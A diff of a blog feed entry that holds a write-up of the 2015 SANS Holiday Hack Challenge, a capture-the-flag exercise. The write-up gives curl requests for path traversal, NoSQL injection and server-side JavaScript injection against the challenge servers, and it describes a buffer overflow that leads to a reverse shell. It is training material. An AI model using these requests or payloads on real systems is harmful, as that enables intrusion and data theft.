@@ -17,7 +17,7 @@
       <guid>http://camelinc.info/blog/2016/01/The-2015-SANS-Holiday-Hack-Challenge---Solution/</guid>
       <description>
 
-&lt;h1 id=&#34;summary:fc53e74f05f8f7542d80a6ee08c867a6&#34;&gt;Summary&lt;/h1&gt;
+&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
 
 &lt;ol&gt;
 &lt;li&gt;Which commands are sent across the Gnome’s command-and-control channel?
@@ -92,11 +92,12 @@
 &lt;li&gt;SG-02: A path traversal vulnerability allowed to download arbitrary files in the context of a standard user.&lt;/li&gt;
 &lt;li&gt;SG-03: A NoSQL injection in the login form was exploited in order to login as admin user.&lt;/li&gt;
 &lt;li&gt;SG-04: The system was compromised via server side javascript injection in NodeJS.&lt;/li&gt;
-&lt;li&gt;SG-05: Weaponize remote exploit for sgstadt (4242/tcp) in order to  a reverse shell.&lt;/li&gt;
+&lt;li&gt;SG-05: Weaponize remote exploit for sgstadt (4242/tcp) in order to  a reverse shell.
+&lt;br /&gt;&lt;/li&gt;
 &lt;/ol&gt;&lt;/li&gt;
 &lt;/ol&gt;
 
-&lt;h1 id=&#34;part-1-dance-of-the-sugar-gnome-fairies-curious-wireless-packets:fc53e74f05f8f7542d80a6ee08c867a6&#34;&gt;Part 1: Dance of the Sugar Gnome Fairies: Curious Wireless Packets&lt;/h1&gt;
+&lt;h1 id=&#34;part-1-dance-of-the-sugar-gnome-fairies-curious-wireless-packets&#34;&gt;Part 1: Dance of the Sugar Gnome Fairies: Curious Wireless Packets&lt;/h1&gt;
 
 &lt;p&gt;The packet capture includes mostly traffic on port 53/udp.
 A client system at 52.2.229.189 is querying the dns server at 10.42.0.18 for a TXT record.
@@ -120,7 +121,7 @@ Finally, in packet 875 the server requests a file with &lt;code&gt;FILE:/root/Pi
 &lt;p&gt;With this information a script can easily be created that automates that task.
 Find the code below in the code section &lt;a href=&#34;#decrypt-c-c-communication:f01f8c0644e5f5332f225b6c091c5a59&#34;&gt;decode.py&lt;/a&gt;.&lt;/p&gt;
 
-&lt;h1 id=&#34;part-2-i-ll-be-gnome-for-christmas-firmware-analysis-for-fun-and-profit:fc53e74f05f8f7542d80a6ee08c867a6&#34;&gt;Part 2: I’ll be Gnome for Christmas: Firmware Analysis for Fun and Profit&lt;/h1&gt;
+&lt;h1 id=&#34;part-2-i-ll-be-gnome-for-christmas-firmware-analysis-for-fun-and-profit&#34;&gt;Part 2: I’ll be Gnome for Christmas: Firmware Analysis for Fun and Profit&lt;/h1&gt;
 
 &lt;p&gt;After unpacking the firmware binary with binwalk, let&amp;rsquo;s take a look at the system.
 A look at &lt;code&gt;etc/banner&lt;/code&gt; makes clear, that the image is based on OpenWRT, a popular alternative router firmware.&lt;/p&gt;
@@ -179,7 +180,7 @@ user_level
 &lt;p&gt;Looks like the application stores cleartext passwords.
 We can also follow the guide from &lt;a href=&#34;https://pen-testing.sans.org/blog/2015/12/03/nosql-no-problem-pillaging-mongodb-for-fun-and-profit&#34;&gt;SANS Penetration Testing&lt;/a&gt; to pillage the database.&lt;/p&gt;
 
-&lt;h1 id=&#34;part-3-let-it-gnome-let-it-gnome-let-it-gnome-internet-wide-scavenger-hunt:fc53e74f05f8f7542d80a6ee08c867a6&#34;&gt;Part 3: Let it Gnome!  Let it Gnome!  Let it Gnome! Internet-Wide Scavenger Hunt&lt;/h1&gt;
+&lt;h1 id=&#34;part-3-let-it-gnome-let-it-gnome-let-it-gnome-internet-wide-scavenger-hunt&#34;&gt;Part 3: Let it Gnome!  Let it Gnome!  Let it Gnome! Internet-Wide Scavenger Hunt&lt;/h1&gt;
 
 &lt;p&gt;The first IP address is listed in the &lt;code&gt;etc/hosts&lt;/code&gt; of the firmware image.
 With the information from the web application a shodan search might also yield some useful results.
@@ -205,11 +206,11 @@ With the information from the web application a shodan search might also yield s
 
 
 
-&lt;h1 id=&#34;part-4-there-s-no-place-like-gnome-for-the-holidays-gnomage-pwnage:fc53e74f05f8f7542d80a6ee08c867a6&#34;&gt;Part 4: There’s No Place Like Gnome for the Holidays: Gnomage Pwnage&lt;/h1&gt;
+&lt;h1 id=&#34;part-4-there-s-no-place-like-gnome-for-the-holidays-gnomage-pwnage&#34;&gt;Part 4: There’s No Place Like Gnome for the Holidays: Gnomage Pwnage&lt;/h1&gt;
 
-&lt;h2 id=&#34;vulnerabilities:fc53e74f05f8f7542d80a6ee08c867a6&#34;&gt;Vulnerabilities&lt;/h2&gt;
+&lt;h2 id=&#34;vulnerabilities&#34;&gt;Vulnerabilities&lt;/h2&gt;
 
-&lt;h3 id=&#34;improper-storage-of-passwords:fc53e74f05f8f7542d80a6ee08c867a6&#34;&gt;Improper storage of passwords&lt;/h3&gt;
+&lt;h3 id=&#34;improper-storage-of-passwords&#34;&gt;Improper storage of passwords&lt;/h3&gt;
 
 &lt;p&gt;Passwords are stored in clear text in the MongoDB database.&lt;/p&gt;
 
@@ -217,7 +218,7 @@ With the information from the web application a shodan search might also yield s
 admin: SittingOnAShelf
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h3 id=&#34;nosql-injection:fc53e74f05f8f7542d80a6ee08c867a6&#34;&gt;NoSQL injection&lt;/h3&gt;
+&lt;h3 id=&#34;nosql-injection&#34;&gt;NoSQL injection&lt;/h3&gt;
 
 &lt;p&gt;Possible NoSQL injection for the login post in &lt;code&gt;routes/index.js:109&lt;/code&gt;.
 Exploitation might not possible as &amp;ldquo;extended = false&amp;rdquo; for the firmware as described at &lt;a href=&#34;https://stackoverflow.com/questions/24330014/bodyparser-is-deprecated-express-4#comment-49638474&#34;&gt;StackExchange&lt;/a&gt;.&lt;/p&gt;
@@ -232,7 +233,7 @@ Exploitation might not possible as &amp;ldquo;extended = false&amp;rdquo; for th
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h3 id=&#34;server-side-javascript-injection:fc53e74f05f8f7542d80a6ee08c867a6&#34;&gt;Server Side Javascript Injection&lt;/h3&gt;
+&lt;h3 id=&#34;server-side-javascript-injection&#34;&gt;Server Side Javascript Injection&lt;/h3&gt;
 
 &lt;p&gt;Possible server side javascript injection for file upload in &lt;code&gt;routes/index.js:166&lt;/code&gt;.
 The user provided parameter: &lt;code&gt;posproc&lt;/code&gt; is utilized in an unsanatized &lt;code&gt;eval()&lt;/code&gt;.&lt;/p&gt;
@@ -259,7 +260,7 @@ The user provided parameter: &lt;code&gt;posproc&lt;/code&gt; is utilized in an 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h3 id=&#34;path-traversal:fc53e74f05f8f7542d80a6ee08c867a6&#34;&gt;Path Traversal&lt;/h3&gt;
+&lt;h3 id=&#34;path-traversal&#34;&gt;Path Traversal&lt;/h3&gt;
 
 &lt;p&gt;Local file inclusion via directory traversal in &lt;code&gt;routes/index.js:187&lt;/code&gt;
 The code checks whether the requested file path contains a &amp;ldquo;.png&amp;rdquo;.
@@ -284,7 +285,7 @@ The file upload can be utilized to create a temporary folder with a suitable nam
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h3 id=&#34;remote-buffer-overflow:fc53e74f05f8f7542d80a6ee08c867a6&#34;&gt;Remote Buffer Overflow&lt;/h3&gt;
+&lt;h3 id=&#34;remote-buffer-overflow&#34;&gt;Remote Buffer Overflow&lt;/h3&gt;
 
 &lt;p&gt;A buffer overflow exists in sgnet_readn that is utilized in &lt;code&gt;sgstatd.c:147:&lt;/code&gt;.
 The input buffer is 100 bytes while the function sgnet_readn reads 200 bytes.
@@ -293,7 +294,7 @@ This is a classical stack based buffer overflow.&lt;/p&gt;
 &lt;p&gt;The stack canary is static and can easily be repaired.
 The stack canary includes a &lt;code&gt;JMP ESP&lt;/code&gt; as a partial command. This assembly instruction is crucial for exploitation.&lt;/p&gt;
 
-&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
 &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sgstatd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
 	&lt;span class=&#34;n&#34;&gt;__asm__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;movl $0xe4ffffe4, -4(%ebp)&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
@@ -311,11 +312,11 @@ The stack canary includes a &lt;code&gt;JMP ESP&lt;/code&gt; as a partial comman
 &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;/p&gt;
 
-&lt;h2 id=&#34;exploitation:fc53e74f05f8f7542d80a6ee08c867a6&#34;&gt;Exploitation&lt;/h2&gt;
 
-&lt;h3 id=&#34;supergnome-1:fc53e74f05f8f7542d80a6ee08c867a6&#34;&gt;Supergnome 1&lt;/h3&gt;
+&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
+
+&lt;h3 id=&#34;supergnome-1&#34;&gt;Supergnome 1&lt;/h3&gt;
 
 &lt;p&gt;The cleartext credentials stored in the firmware image allow administrative access to the system.&lt;/p&gt;
 
@@ -325,14 +326,14 @@ pass: SittingOnAShelf
 
 &lt;p&gt;Simply navigate to the files section and download the configuration file.&lt;/p&gt;
 
-&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;err&#34;&gt;Gnome&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Serial&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Number:&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;NCC1701&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;err&#34;&gt;Gnome&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Serial&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Number:&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;NCC1701&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;/p&gt;
+
 
 &lt;p&gt;That&amp;rsquo;s an obvious easter egg.
 NCC-1701 is the alternative name for the starship USS Enterprise in the fictional Star Trek universe.&lt;/p&gt;
 
-&lt;p&gt;
+
 
 &lt;figure class=&#34;fcenter fsmall&#34;&gt;
     &lt;a href=&#34;http://camelinc.info/img/post/2015/holidayhack/NCC1701.jpg&#34; data-lightbox=&#34;default&#34; data-title=&#34;NCC1701&#34; &gt;
@@ -340,16 +341,16 @@ NCC-1701 is the alternative name for the starship USS Enterprise in the fictiona
     &lt;/a&gt;
 &lt;/figure&gt;
 
-&lt;/p&gt;
 
-&lt;h3 id=&#34;supergnome-2:fc53e74f05f8f7542d80a6ee08c867a6&#34;&gt;Supergnome 2&lt;/h3&gt;
+
+&lt;h3 id=&#34;supergnome-2&#34;&gt;Supergnome 2&lt;/h3&gt;
 
 &lt;p&gt;A path traversal vulnerability allowed to download arbitrary files in the context of the admin user.
 First, a temporary directory has to be created by uploading a configuration file.
 The server response includes the full path to the temporary directory.
 According to the application code, the temporary directory is created and never deleted.&lt;/p&gt;
 
-&lt;p&gt;
+
 
 &lt;figure class=&#34;fcenter&#34;&gt;
     &lt;a href=&#34;http://camelinc.info/img/post/2015/holidayhack/Path_Traversal-1.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Path Traversal - step 1&#34; &gt;
@@ -357,7 +358,7 @@ According to the application code, the temporary directory is created and never 
     &lt;/a&gt;
 &lt;/figure&gt;
 
-&lt;/p&gt;
+
 
 &lt;pre&gt;&lt;code&gt;curl -s -k  -X &#39;POST&#39; -b &#39;sessionid=Knd8Zz6X77F0bdC3ldBa&#39; \
     -H &#39;Content-Type: application/x-www-form-urlencoded&#39; \
@@ -369,7 +370,7 @@ According to the application code, the temporary directory is created and never 
 Simply add the respective path in the request to a camera image in order to exploit the vulnerability.
 Let&amp;rsquo;s download files in the context of the gnome-admin user!&lt;/p&gt;
 
-&lt;p&gt;
+
 
 &lt;figure class=&#34;fcenter&#34;&gt;
     &lt;a href=&#34;http://camelinc.info/img/post/2015/holidayhack/Path_Traversal-2.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Path Traversal - step 2&#34; &gt;
@@ -377,7 +378,7 @@ Let&amp;rsquo;s download files in the context of the gnome-admin user!&lt;/p&gt;
     &lt;/a&gt;
 &lt;/figure&gt;
 
-&lt;/p&gt;
+
 
 &lt;pre&gt;&lt;code&gt;curl -s -k  -X &#39;GET&#39; -b &#39;sessionid=Knd8Zz6X77F0bdC3ldBa&#39; \
     &#39;http://52.34.3.80/cam?camera=%2e%2e/upload/iLZKMlKm/.png/%2e%2e/%2e%2e/%2e%2e/%2e%2e/files/gnome.conf&#39;
@@ -385,13 +386,13 @@ Let&amp;rsquo;s download files in the context of the gnome-admin user!&lt;/p&gt;
 
 &lt;p&gt;Finally, take a short glance at the gnome configuration file.&lt;/p&gt;
 
-&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;err&#34;&gt;Gnome&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Serial&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Number:&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;XKCD988&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;err&#34;&gt;Gnome&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Serial&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Number:&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;XKCD988&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;/p&gt;
+
 
 &lt;p&gt;Again, the gnome serial number is an easter egg and points to &lt;a href=&#34;http://xkcd.com/988/&#34;&gt;XKCD 988&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;
+
 
 &lt;figure class=&#34;fcenter fsmall&#34;&gt;
     &lt;a href=&#34;http://imgs.xkcd.com/comics/tradition.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Tradition&#34; &gt;
@@ -399,13 +400,13 @@ Let&amp;rsquo;s download files in the context of the gnome-admin user!&lt;/p&gt;
     &lt;/a&gt;
 &lt;/figure&gt;
 
-&lt;/p&gt;
 
-&lt;h3 id=&#34;supergnome-3:fc53e74f05f8f7542d80a6ee08c867a6&#34;&gt;Supergnome 3&lt;/h3&gt;
+
+&lt;h3 id=&#34;supergnome-3&#34;&gt;Supergnome 3&lt;/h3&gt;
 
 &lt;p&gt;A NoSQL injection in the login form was exploited in order to login as admin user.&lt;/p&gt;
 
-&lt;p&gt;
+
 
 &lt;figure class=&#34;fcenter&#34;&gt;
     &lt;a href=&#34;http://camelinc.info/img/post/2015/holidayhack/NoSQL_injection.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;NoSQL Injection on the login form.&#34; &gt;
@@ -413,7 +414,7 @@ Let&amp;rsquo;s download files in the context of the gnome-admin user!&lt;/p&gt;
     &lt;/a&gt;
 &lt;/figure&gt;
 
-&lt;/p&gt;
+
 
 &lt;pre&gt;&lt;code&gt;curl -s -k -X &#39;POST&#39; -b &#39;sessionid=blcGsGlPTvewgL5k3VIk&#39; \
     -H &#39;Content-Type: application/json&#39; \
@@ -423,7 +424,7 @@ Let&amp;rsquo;s download files in the context of the gnome-admin user!&lt;/p&gt;
 
 &lt;p&gt;Some additional NoSQL trickery lets us brute-force the accounts and passwords.&lt;/p&gt;
 
-&lt;p&gt;
+
 
 &lt;figure class=&#34;fcenter&#34;&gt;
     &lt;a href=&#34;http://camelinc.info/img/post/2015/holidayhack/NoSQL_injection_bruteforce.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Brute-Forcing the password for admin.&#34; &gt;
@@ -431,18 +432,18 @@ Let&amp;rsquo;s download files in the context of the gnome-admin user!&lt;/p&gt;
     &lt;/a&gt;
 &lt;/figure&gt;
 
-&lt;/p&gt;
+
 
 &lt;p&gt;With admin privileges, simply download the gnome configuration.&lt;/p&gt;
 
-&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;err&#34;&gt;Gnome&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Serial&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Number:&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;THX1138&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;err&#34;&gt;Gnome&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Serial&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Number:&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;THX1138&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;/p&gt;
+
 
 &lt;p&gt;The serial number is the title of an early Georg Lucas movie.
 Go watch it!&lt;/p&gt;
 
-&lt;p&gt;
+
 
 &lt;figure class=&#34;fcenter fsmall&#34;&gt;
     &lt;a href=&#34;http://camelinc.info/img/post/2015/holidayhack/THX1138.jpg&#34; data-lightbox=&#34;default&#34; data-title=&#34;THX 1138&#34; &gt;
@@ -450,7 +451,7 @@ Go watch it!&lt;/p&gt;
     &lt;/a&gt;
 &lt;/figure&gt;
 
-&lt;/p&gt;
+
 
 &lt;p&gt;The following credentials could be recovered from the database.
 The SuperGnome admin louise seems to be a fan of the song &lt;a href=&#34;https://www.youtube.com/watch?v=MbkY23wSL9c&#34;&gt;Welcome Christmas&lt;/a&gt; from the musical.&lt;/p&gt;
@@ -459,13 +460,13 @@ The SuperGnome admin louise seems to be a fan of the song &lt;a href=&#34;https:
 louise: FahWhoRahMoose
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h3 id=&#34;supergnome-4:fc53e74f05f8f7542d80a6ee08c867a6&#34;&gt;Supergnome 4&lt;/h3&gt;
+&lt;h3 id=&#34;supergnome-4&#34;&gt;Supergnome 4&lt;/h3&gt;
 
 &lt;p&gt;The system was compromised via server side javascript injection in NodeJS.
 The initial credentials for a valid session are present in the firmware image.
 With a valid session id, simply upload a file and include the SSJS payload of your choice in the postproc variable.&lt;/p&gt;
 
-&lt;p&gt;
+
 
 &lt;figure class=&#34;fcenter&#34;&gt;
     &lt;a href=&#34;http://camelinc.info/img/post/2015/holidayhack/SSJS_Injection.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Server-Side JavaScript Injection&#34; &gt;
@@ -473,7 +474,7 @@ With a valid session id, simply upload a file and include the SSJS payload of yo
     &lt;/a&gt;
 &lt;/figure&gt;
 
-&lt;/p&gt;
+
 
 &lt;pre&gt;&lt;code&gt;curl -s -k -X &#39;POST&#39; -b &#39;sessionid=QWnIchSxTmT8BIyHE5OL&#39; \
        -H &#39;Content-Type: multipart/form-data; boundary=---------------------------1353123760992125901018690058&#39; \
@@ -484,13 +485,13 @@ With a valid session id, simply upload a file and include the SSJS payload of yo
 &lt;p&gt;The above command reads the contents of gnome configuration file and sends it back to the attacker.
 Other handy payloads might be to open a reverse shell.&lt;/p&gt;
 
-&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;err&#34;&gt;Gnome&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Serial&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Number:&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;BU22_1729_2716057&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;err&#34;&gt;Gnome&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Serial&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Number:&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;BU22_1729_2716057&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;/p&gt;
+
 
 &lt;p&gt;The serial number likely refers to Bending Unit 22, unit number 1729, serial number 2716057&lt;/p&gt;
 
-&lt;p&gt;
+
 
 &lt;figure class=&#34;fcenter fsmall&#34;&gt;
     &lt;a href=&#34;http://camelinc.info/img/post/2015/holidayhack/BU22_1729_2716057.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Bender_Rodriguez&#34; &gt;
@@ -498,7 +499,7 @@ Other handy payloads might be to open a reverse shell.&lt;/p&gt;
     &lt;/a&gt;
 &lt;/figure&gt;
 
-&lt;/p&gt;
+
 
 &lt;p&gt;The following credentials could be recovered from the database.
 Nedford, the SuperGnome admin seems to be quite enthusiastic about his work.&lt;/p&gt;
@@ -507,7 +508,7 @@ Nedford, the SuperGnome admin seems to be quite enthusiastic about his work.&lt;
 nedford: AllIWantForXmasIsYourPresents
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h3 id=&#34;supergnome-5:fc53e74f05f8f7542d80a6ee08c867a6&#34;&gt;Supergnome 5&lt;/h3&gt;
+&lt;h3 id=&#34;supergnome-5&#34;&gt;Supergnome 5&lt;/h3&gt;
 
 &lt;p&gt;The vulnerability is in the sgstatd daemon running on port 4242/tcp.
 The target buffer is 100 bytes, yet the program read 200 bytes giving us a classic buffer overflow.
@@ -519,7 +520,7 @@ Furthermore, the canary includes a partial assembly instruction necessary to exp
 Using this binary allows to adjust the addresses in the exploit.
 The remote exploit proof-of-concept code is listed &lt;a href=&#34;#sgstatd-remote-exploit:f01f8c0644e5f5332f225b6c091c5a59&#34;&gt;below&lt;/a&gt;.&lt;/p&gt;
 
-&lt;p&gt;
+
 
 &lt;figure class=&#34;fcenter&#34;&gt;
     &lt;a href=&#34;http://camelinc.info/img/post/2015/holidayhack/SG5-whoami.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Established remote shell on SuperGnome 5.&#34; &gt;
@@ -527,14 +528,14 @@ The remote exploit proof-of-concept code is listed &lt;a href=&#34;#sgstatd-remo
     &lt;/a&gt;
 &lt;/figure&gt;
 
-&lt;/p&gt;
+
 
 &lt;p&gt;The reverse shell is only executed with the unpriviledged nobody user&amp;rsquo;s rights.
 Yet, we can access the gnome configuration because of poor access rights.&lt;/p&gt;
 
-&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;err&#34;&gt;Gnome&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Serial&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Number:&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;4CKL3R43V4&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span class=&#34;err&#34;&gt;Gnome&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Serial&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;Number:&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;4CKL3R43V4&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;/p&gt;
+
 
 &lt;p&gt;No idea what this serial number might point to.
 It looks like leet speak for &lt;code&gt;ACK LE RAEVA&lt;/code&gt;.&lt;/p&gt;
@@ -546,13 +547,13 @@ The real Grinch has be uncovered!&lt;/p&gt;
 sims: IAmTheRealGrinch!
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h1 id=&#34;part-5-baby-it-s-gnome-outside-sinister-plot-and-attribution:fc53e74f05f8f7542d80a6ee08c867a6&#34;&gt;Part 5: Baby, It’s Gnome Outside: Sinister Plot and Attribution&lt;/h1&gt;
+&lt;h1 id=&#34;part-5-baby-it-s-gnome-outside-sinister-plot-and-attribution&#34;&gt;Part 5: Baby, It’s Gnome Outside: Sinister Plot and Attribution&lt;/h1&gt;
 
 &lt;p&gt;Each SuperGnome has got one unique packet stored in the files folder.
 The packet captures include SMTP traffic between a client and a server.
 All five emails are associate with the mail address &lt;code&gt;c@atnascorp.com&lt;/code&gt;.&lt;/p&gt;
 
-&lt;h2 id=&#34;what-is-the-nefarious-plot-of-atnas-corporation:fc53e74f05f8f7542d80a6ee08c867a6&#34;&gt;What is the nefarious plot of ATNAS Corporation?&lt;/h2&gt;
+&lt;h2 id=&#34;what-is-the-nefarious-plot-of-atnas-corporation&#34;&gt;What is the nefarious plot of ATNAS Corporation?&lt;/h2&gt;
 
 &lt;p&gt;All the recovered mails include hints to the plans of ATNAS Corporation.&lt;/p&gt;
 
@@ -589,7 +590,7 @@ head, and send the little moppet back to bed.&lt;/p&gt;
 &lt;p&gt;The packet capture on SuperGnome 5 includes an email from the Grinch to the villain.
 He tries to apologize for his wrong doings a long time ago.&lt;/p&gt;
 
-&lt;h2 id=&#34;who-is-the-villain-behind-the-nefarious-plot:fc53e74f05f8f7542d80a6ee08c867a6&#34;&gt;Who is the villain behind the nefarious plot?&lt;/h2&gt;
+&lt;h2 id=&#34;who-is-the-villain-behind-the-nefarious-plot&#34;&gt;Who is the villain behind the nefarious plot?&lt;/h2&gt;
 
 &lt;p&gt;The most interesting mail is stored on SuperGnome 4 in 20151203133815.zip.
 It is addressed to &lt;code&gt;psychdoctor@whovillepsychiatrists.com&lt;/code&gt; and signed by &lt;code&gt;Cindy Lou Who&lt;/code&gt;.&lt;/p&gt;
@@ -602,7 +603,7 @@ The restored video feed &lt;a href=&#34;http://camelinc.info/img/post/2015/holid
 
 &lt;p&gt;With the information from the mail, we can compare the latest known image of Cindy-Lou Who with the restored image:&lt;/p&gt;
 
-&lt;p&gt;
+
 
 &lt;figure class=&#34;fcenter fsmall&#34;&gt;
     &lt;a href=&#34;http://camelinc.info/img/post/2015/holidayhack/Cindy_Lou_Who.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Image comparison&#34; &gt;
@@ -610,31 +611,32 @@ The restored video feed &lt;a href=&#34;http://camelinc.info/img/post/2015/holid
     &lt;/a&gt;
 &lt;/figure&gt;
 
-&lt;/p&gt;
 
-&lt;h1 id=&#34;links:fc53e74f05f8f7542d80a6ee08c867a6&#34;&gt;Links&lt;/h1&gt;
 
-&lt;h2 id=&#34;part-1:fc53e74f05f8f7542d80a6ee08c867a6&#34;&gt;Part 1&lt;/h2&gt;
+&lt;h1 id=&#34;links&#34;&gt;Links&lt;/h1&gt;
+
+&lt;h2 id=&#34;part-1&#34;&gt;Part 1&lt;/h2&gt;
 
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;https://thepacketgeek.com/importing-packets-from-trace-files/&#34;&gt;Importing packets from trace files with scapy&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://thepacketgeek.com/scapy-sniffing-with-custom-actions-part-1/&#34;&gt;Scapy Sniffing with Custom Actions, Part 1 | thePacketGeek&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://thepacketgeek.com/scapy-sniffing-with-custom-actions-part-1/&#34;&gt;Scapy Sniffing with Custom Actions, Part 1 | thePacketGeek&lt;/a&gt;
+&lt;br /&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h2 id=&#34;part-2:fc53e74f05f8f7542d80a6ee08c867a6&#34;&gt;Part 2&lt;/h2&gt;
+&lt;h2 id=&#34;part-2&#34;&gt;Part 2&lt;/h2&gt;
 
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;https://pen-testing.sans.org/blog/2015/12/03/nosql-no-problem-pillaging-mongodb-for-fun-and-profit&#34;&gt;NoSQL? No Problem! Pillaging MongoDB for Fun and Profit&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h2 id=&#34;part-3:fc53e74f05f8f7542d80a6ee08c867a6&#34;&gt;Part 3&lt;/h2&gt;
+&lt;h2 id=&#34;part-3&#34;&gt;Part 3&lt;/h2&gt;
 
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;https://www.shodan.io/search?query=SuperGnome&amp;amp;language=en&#34;&gt;shodan.io&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://pen-testing.sans.org/blog/pen-testing/2015/12/08/effective-shodan-searches&#34;&gt;Getting the Most Out of Shodan Searches&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
